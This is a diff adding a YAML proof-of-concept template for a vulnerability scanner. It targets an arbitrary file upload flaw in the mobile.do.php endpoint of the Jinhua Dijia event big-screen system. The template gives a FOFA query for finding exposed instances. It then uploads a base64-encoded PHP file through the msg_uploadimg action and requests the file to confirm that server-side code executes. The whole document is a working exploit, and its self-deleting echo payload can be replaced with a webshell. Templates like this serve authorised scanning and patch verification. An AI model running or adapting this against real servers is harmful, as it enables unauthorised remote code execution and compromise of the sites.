@@ -1,0 +1,24 @@
+id: poc-yaml-deejia-mobile-do-php-anyfile-upload
+info:
+  name: 金华迪加现场大屏互动系统 mobile.do.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 金华迪加现场大屏互动系统
+  fofa: body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统"
+variables:
+  t1: random_str(6)
+  payload: base64(concat(`<?php echo `,t1,`;unlink(__FILE__);?>`))
+requests:
+- method: POST
+  path: /mobile/mobile.do.php?action=msg_uploadimg
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: filetype=php&imgbase64={{.payload}}
+  expression: status_code == 200 && contains(body,"picurl") && contains(body,".php")
+  output:
+  - regex_match(body,`pic_(?P<file>.*?).php`)
+- method: GET
+  path: /data/pic/pic_{{.file}}.php
+  expression: status_code == 200 && body == t1
+transport: http
